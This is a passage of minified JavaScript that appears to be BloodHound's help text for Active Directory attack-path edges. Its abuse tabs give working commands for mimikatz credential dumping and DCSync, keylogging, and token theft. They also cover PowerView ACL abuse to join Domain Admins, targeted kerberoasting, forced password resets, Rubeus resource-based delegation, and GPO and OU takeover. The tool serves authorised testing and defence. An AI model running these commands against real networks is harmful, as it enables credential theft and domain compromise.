tab."}),$c=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]}),Ic={general:Cc,windowsAbuse:Dc,linuxAbuse:Rc,opsec:Oc,references:$c},Mc=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",I(r)," ",n," has, in its SIDHistory attribute, the SID for the"," ",I(s)," ",a,"."]}),e.jsxs(t,{variant:"body2",children:["When a kerberos ticket is created for ",n,", it will include the SID for ",a,", and therefore grant",n," the same privileges and permissions as",a,"."]})]}),Gc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"No special actions are needed to abuse this, as the kerberos tickets created will have all SIDs in the object's SID history attribute added to them; however, if traversing a domain trust boundary, ensure that SID filtering is not enforced, as SID filtering will ignore any SIDs in the SID history portion of a kerberos ticket."}),e.jsx(t,{variant:"body2",children:"By default, SID filtering is not enabled for all domain trust types."})]}),Ec=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations apply to this edge."}),Fc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/the-trustpocalypse/",children:"https://blog.harmj0y.net/redteaming/the-trustpocalypse/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/",children:"https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1772",children:"https://adsecurity.org/?p=1772"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?tag=sidhistory",children:"https://adsecurity.org/?tag=sidhistory"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1178/",children:"https://attack.mitre.org/techniques/T1178/"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/",children:"https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/"})]}),Uc={general:Mc,abuse:Gc,opsec:Ec,references:Fc},_c=({sourceName:n,targetName:r})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The user ",r," has a session on the computer ",n,"."]}),e.jsx(t,{variant:"body2",children:"When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process."}),e.jsx(t,{variant:"body2",children:"Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists."}),e.jsx(t,{variant:"body2",children:"Note: A session does not guarantee credential material is present, only possible."})]}),Lc=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Password Theft"}),e.jsx(t,{variant:"body2",children:"When a user has a session on the computer, you may be able to obtain credentials for the user via credential dumping or token impersonation. You must be able to move laterally to the computer, have administrative access on the computer, and the user must have a non-network logon session on the computer."}),e.jsx(t,{variant:"body2",children:"Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on the target, you can use mimikatz to dump credentials of the user that has a session on the computer. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."}),e.jsx(t,{variant:"body2",children:`You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.`}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(t,{variant:"body2",children:"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."}),e.jsx(t,{variant:"body2",children:"User sessions can be short lived and only represent the sessions that were present at the time of collection. A user may have ended their session by the time you move to the computer to target them. However, users tend to use the same machines, such as the workstations or servers they are assigned to use for their job duties, so it can be valuable to check multiple times if a user session has started."})]}),Wc=()=>e.jsx(t,{variant:"body2",children:"An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab."}),zc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(t,{variant:"body1",children:"Gathering Credentials"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"http://blog.gentilkiwi.com/mimikatz",children:"http://blog.gentilkiwi.com/mimikatz"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?page_id=1821",children:"https://adsecurity.org/?page_id=1821"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Credential_Access",children:"https://attack.mitre.org/wiki/Credential_Access"}),e.jsx(t,{variant:"body1",children:"Token Impersonation"}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf",children:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1"}),e.jsx("br",{}),e.jsx(o,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Technique/T1134",children:"https://attack.mitre.org/wiki/Technique/T1134"})]}),Bc={general:_c,abuse:Lc,opsec:Wc,references:zc},Nc=({sourceName:n,sourceType:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",I(r)," ",n," is a member of the group ",a,"."]}),e.jsx(t,{variant:"body2",children:"Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions."})]}),Vc=()=>e.jsx(t,{variant:"body2",children:"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."}),Kc=()=>e.jsx(t,{variant:"body2",children:"No opsec considerations apply to this edge."}),Hc=()=>e.jsxs(h,{sx:{overflowX:"auto"},children:[e.jsx(o,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?tag=ad-delegation",children:"https://adsecurity.org/?tag=ad-delegation"}),e.jsx("br",{}),e.jsxs(o,{target:"_blank",rel:"noopener",href:"https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions ",children:["https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions"," "]})]}),qc={general:Nc,abuse:Vc,opsec:Kc,references:Hc},Yc=({sourceName:n,sourceType:r,targetName:a,targetType:s})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[k(r,n)," ownership of the ",I(s)," ",a,"."]}),e.jsx(t,{variant:"body2",children:"Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL"})]}),Jc=({sourceName:n,sourceType:r,targetName:a,targetType:s,targetId:i,haslaps:c})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),e.jsx(t,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),e.jsx(t,{component:"pre",children:'Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),e.jsx(t,{variant:"body1",children:" Force Change Password "}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password."}),e.jsx(t,{variant:"body2",children:"Alternatively, you can execute a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack."}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",n,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",r==="User"?`${n} if you are not running a process as that user`:`a member of ${n} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):"}),e.jsx(t,{component:"pre",children:`Add-DomainObjectAcl -Credential $Cred -TargetIdentity ${i} -Rights All`}),e.jsx(t,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),e.jsxs(t,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",a," is: ",i,"."]}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),e.jsx(t,{component:"pre",children:`$OU = Get-DomainOU -Raw (OU GUID)
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`})]});default:return null}},Xc=({sourceName:n,sourceType:r,targetName:a,targetType:s,targetId:i,haslaps:c})=>{switch(s){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:" Modifying the rights "}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember privilege."}),e.jsx(t,{variant:"body2",children:`Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body1",children:" Adding to the group "}),e.jsx(t,{variant:"body2",children:"You can now add members to the group."}),e.jsx(t,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),e.jsx(t,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["Pass-the-hash can also be done here with"," 